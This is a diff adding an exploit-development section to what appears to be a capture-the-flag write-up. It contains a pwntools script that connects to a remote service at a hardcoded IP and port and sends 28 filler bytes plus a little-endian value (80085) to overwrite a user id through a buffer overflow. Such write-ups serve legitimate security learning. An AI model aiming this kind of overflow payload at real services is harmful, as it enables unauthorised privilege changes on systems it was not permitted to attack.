@@ -147,3 +147,25 @@ so for set u.id to 80085 ->  in hex 0x000138D5
 In little-endian representation, the least significant byte comes first. Therefore, 80085 (0x000138D5) is stored in memory as 0xD5 0x38 0x01 0x00
 
 ## Exploit Development
+
+```py
+from pwn import *
+
+# connection to the remote service
+p = remote('35.184.182.18', 32001)
+
+# Create 28 'A's followed by the bytes 0xD5 0x38 0x01 0x00
+payload = b"A" * 28 + b"\xd5\x38\x01\x00"
+
+p.recvuntil(b'Your Choice, senpai: ')
+p.sendline(b'1')
+
+p.sendline(payload)
+
+p.recvuntil(b'Your Choice, senpai: ')
+p.sendline(b'1')
+
+p.interactive()
+
+```
+$ python3 exploit200.py 
